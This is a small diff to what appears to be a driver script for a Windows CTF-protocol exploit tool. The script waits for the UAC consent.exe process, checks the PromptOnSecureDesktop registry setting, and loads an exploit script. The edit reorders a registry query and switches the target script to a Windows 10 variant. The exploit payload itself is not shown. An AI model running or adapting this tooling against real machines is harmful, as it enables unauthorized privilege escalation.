@@ -24,7 +24,7 @@ sleep 5000
 consent
 
 # Find out if the PromptOnSecureDesktop is enabled.
-reg HKLM Software\Microsoft\Windows\CurrentVersion\Policies\System PromptOnSecureDesktop
+reg HKLM PromptOnSecureDesktop Software\Microsoft\Windows\CurrentVersion\Policies\System
 
 set r0 regval
 
@@ -45,7 +45,7 @@ print consent.exe has joined the session, starting exploit...
 scan
 
 # Now that we're connected and have a target selected, load the exploit script.
-script scripts\ctf-exploit-common-1903.ctf
+script scripts\ctf-exploit-common-win10.ctf
 
 print
 print Exploit complete.
